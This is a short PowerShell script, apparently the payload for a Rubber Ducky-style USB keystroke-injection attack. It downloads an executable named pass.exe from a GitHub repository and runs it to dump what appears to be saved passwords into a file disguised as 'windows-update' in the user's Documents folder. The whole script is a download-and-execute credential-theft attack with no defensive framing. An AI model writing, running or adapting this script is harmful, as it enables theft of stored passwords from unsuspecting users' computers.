$URL = 'https://github.com/RRR3d/ArduinoRubberDucky/raw/main/pass.exe'
$FilePath = "$env:USERPROFILE\Documents\pass.exe"
$Command = "$FilePath /stext $env:USERPROFILE\Documents\windows-update"

# Download the file
Invoke-WebRequest -Uri $URL -OutFile $FilePath

# Run the command
Start-Process -FilePath $FilePath -ArgumentList $Command -Wait
